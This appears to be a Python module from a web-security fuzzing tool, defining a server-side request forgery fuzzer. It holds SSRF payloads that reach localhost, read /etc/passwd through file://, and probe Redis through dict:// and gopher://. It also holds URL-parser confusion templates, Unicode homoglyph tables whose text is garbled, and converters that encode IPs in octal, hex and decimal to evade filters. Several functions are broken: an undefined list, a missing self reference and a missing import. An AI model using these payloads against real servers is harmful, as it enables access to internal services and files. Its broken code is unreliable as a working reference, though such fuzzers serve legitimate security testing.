#!/usr/bin/env python
# -*- coding: utf-8 -*-


from saker.fuzzers.fuzzer import Fuzzer


class SSRF(Fuzzer):

    """Server-Side Request Forgery"""

    Unicode = {
        '0' : ['â“ª','ï¼','ğŸ','ğŸ˜','ğŸ¢','ğŸ¬','ğŸ¶','â°','â‚€'],
        '1' : ['â‘ ','ï¼‘','ğŸ','ğŸ™','ğŸ£','ğŸ­','ğŸ·','Â¹','â‚'],
        '2' : ['â‘¡','ï¼’','ğŸ','ğŸš','ğŸ¤','ğŸ®','ğŸ¸','Â²','â‚‚'],
        '3' : ['â‘¢','ï¼“','ğŸ‘','ğŸ›','ğŸ¥','ğŸ¯','ğŸ¹','Â³','â‚ƒ'],
        '4' : ['â‘£','ï¼”','ğŸ’','ğŸœ','ğŸ¦','ğŸ°','ğŸº','â´','â‚„'],
        '5' : ['â‘¤','ï¼•','ğŸ“','ğŸ','ğŸ§','ğŸ±','ğŸ»','âµ','â‚…'],
        '6' : ['â‘¥','ï¼–','ğŸ”','ğŸ','ğŸ¨','ğŸ²','ğŸ¼','â¶','â‚†'],
        '7' : ['â‘¦','ï¼—','ğŸ•','ğŸŸ','ğŸ©','ğŸ³','ğŸ½','â·','â‚‡'],
        '8' : ['â‘§','ï¼˜','ğŸ–','ğŸ ','ğŸª','ğŸ´','ğŸ¾','â¸','â‚ˆ'],
        '9' : ['â‘¨','ï¼™','ğŸ—','ğŸ¡','ğŸ«','ğŸµ','ğŸ¿','â¹','â‚‰'],
        '10' : ['â‘©'],
        '11' : ['â‘ª'],
        '12' : ['â‘«'],
        '13' : ['â‘¬'],
        '14' : ['â‘­'],
        '15' : ['â‘®'],
        '16' : ['â‘¯'],
        '17' : ['â‘°'],
        '18' : ['â‘±'],
        '19' : ['â‘²'],
        '20' : ['â‘³'],
        '.' : ['ã€‚','ï½¡','ï¼'],
        'a' : ['ï½','ğš','ğ‘','ğ’‚','ğ’¶','ğ“ª','ğ”','ğ•’','ğ–†','ğ–º','ğ—®','ğ˜¢','ğ™–','ğšŠ','â“','ï¼¡','ğ€','ğ´','ğ‘¨','ğ’œ','ğ“','ğ”„','ğ”¸','ğ•¬','ğ– ','ğ—”','ğ˜ˆ','ğ˜¼','ğ™°','â’¶','Âª','áµƒ','â‚','á´¬','ğŸ„°'],
        'b' : ['ï½‚','ğ›','ğ‘','ğ’ƒ','ğ’·','ğ“«','ğ”Ÿ','ğ•“','ğ–‡','ğ–»','ğ—¯','ğ˜£','ğ™—','ğš‹','â“‘','ï¼¢','â„¬','ğ','ğµ','ğ‘©','ğ“‘','ğ”…','ğ”¹','ğ•­','ğ–¡','ğ—•','ğ˜‰','ğ˜½','ğ™±','â’·','áµ‡','á´®','ğŸ„±'],
        'c' : ['ï½ƒ','â…½','ğœ','ğ‘','ğ’„','ğ’¸','ğ“¬','ğ” ','ğ•”','ğ–ˆ','ğ–¼','ğ—°','ğ˜¤','ğ™˜','ğšŒ','â“’','ï¼£','â…­','â„‚','â„­','ğ‚','ğ¶','ğ‘ª','ğ’','ğ“’','ğ•®','ğ–¢','ğ—–','ğ˜Š','ğ˜¾','ğ™²','â’¸','ğŸ„«','á¶œ','ğŸ„²'],
        'd' : ['ï½„','â…¾','â…†','ğ','ğ‘‘','ğ’…','ğ’¹','ğ“­','ğ”¡','ğ••','ğ–‰','ğ–½','ğ—±','ğ˜¥','ğ™™','ğš','â““','ï¼¤','â…®','â……','ğƒ','ğ·','ğ‘«','ğ’Ÿ','ğ““','ğ”‡','ğ”»','ğ•¯','ğ–£','ğ——','ğ˜‹','ğ˜¿','ğ™³','â’¹','áµˆ','á´°','ğŸ„³'],
        'e' : ['ï½…','â„¯','â…‡','ğ','ğ‘’','ğ’†','ğ“®','ğ”¢','ğ•–','ğ–Š','ğ–¾','ğ—²','ğ˜¦','ğ™š','ğš','â“”','ï¼¥','â„°','ğ„','ğ¸','ğ‘¬','ğ“”','ğ”ˆ','ğ”¼','ğ•°','ğ–¤','ğ—˜','ğ˜Œ','ğ™€','ğ™´','â’º','áµ‰','â‚‘','á´±','ğŸ„´'],
        'f' : ['ï½†','ğŸ','ğ‘“','ğ’‡','ğ’»','ğ“¯','ğ”£','ğ•—','ğ–‹','ğ–¿','ğ—³','ğ˜§','ğ™›','ğš','â“•','ï¼¦','â„±','ğ…','ğ¹','ğ‘­','ğ“•','ğ”‰','ğ”½','ğ•±','ğ–¥','ğ—™','ğ˜','ğ™','ğ™µ','â’»','á¶ ','ğŸ„µ'],
        'x' : ['ï½˜','â…¹','ğ±','ğ‘¥','ğ’™','ğ“','ğ”','ğ”µ','ğ•©','ğ–','ğ—‘','ğ˜…','ğ˜¹','ğ™­','ğš¡','â“§','ï¼¸','â…©','ğ—','ğ‘‹','ğ‘¿','ğ’³','ğ“§','ğ”›','ğ•','ğ–ƒ','ğ–·','ğ—«','ğ˜Ÿ','ğ™“','ğš‡','â“','Ë£','â‚“','ğŸ…‡'],
    }

    modes = [
        "http://<fake>&@<real>",
        "http://<real>&@<fake>",
        "http://<fake># @<real>",
        "http://<real># @<fake>",
        "http://<fake>#@<real>",
        "http://<real>#@<fake>",
        "http://foo@<real>:80@<fake>",
    ]

    def __init__(self):
        super(SSRF, self).__init__()

    @staticmethod
    def testlocal():
        payload = ["http://127.0.0.1"]
        payload += ["http://localhost"]
        payload += ["http://sudo.cc"]  # 127.0.0.1
        payload += ["http://127.0.0.1.xip.io"]
        for p in payload:
            yield p

    @staticmethod
    def testproto():
        payload += ["file:///etc/passwd"]
        payload += ["dict://127.0.0.1:6379/info"]
        payload += ["gopher://127.0.0.1"]
        payload += ["ftp://user:pwd@127.0.0.1"]
        for p in payload:
            yield p

    @staticmethod
    def bypass(real, fake="google.com"):
        for m in modes:
            yield m.replace("<real>", real).replace("<fake>", fake)

    @staticmethod
    def ip2oct(ip):
        return ".".join(map(lambda i: oct(int(i)), ip.split(".")))

    @staticmethod
    def ip2hex(ip):
        return ".".join(map(lambda i: hex(int(i)), ip.split(".")))

    @staticmethod
    def ip2dec(ip):
        return str(reduce(lambda x, y: (x << 8)+y, map(int, ip.split(".")))).strip("L")

    @staticmethod
    def ip2hexI(ip):
        return hex(reduce(lambda x, y: (x << 8)+y, map(int, ip.split(".")))).strip("L")
